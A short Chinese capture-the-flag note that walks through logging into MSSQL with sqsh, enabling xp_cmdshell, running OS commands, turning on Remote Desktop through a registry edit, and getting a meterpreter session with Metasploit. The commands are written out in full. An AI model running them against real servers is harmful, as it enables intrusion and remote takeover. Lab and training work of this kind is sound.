

以下内容的前提是有 *mssql* 的账号密码，且能成功登录。

***sqsh*** 

1. 配置 */etc/freetds/freetds.conf*

```bash
[mssql]
host = x.x.x.x
port = 1433
tds version = 7.0
```

2. 编辑或新增 *~/.sqshrc*

```bash
\set username=sa
\set password=password
\set style=vert
```

3. 连接对应的数据库

```bash
$ sqsh -S mssql
```

4. 在 *sqsh* 交互式的界面下查看 *mssql* 的数据库列表

```bash
SELECT name FROM master..sysdatabases
GO
```

5. 启用 *xp_cmdshell* （版本低于 *SQL Server 2005* 的 *mssql* 默认启用）

```bash
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configure 'xp_cmdshell', 1
go
reconfigure
go
```

6. 执行命令

```bash
xp_cmdshell 'dir c:\'
go
```

7. 权限足够大的前提下有两种思路获得相关 *flag*
   - 远程桌面登录，开启 3389 端口（*xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'*）
   - 使用 *windows/mssql/mssql_payload* 获取 *meterpreter session*

### ChangeLog

- 190714 init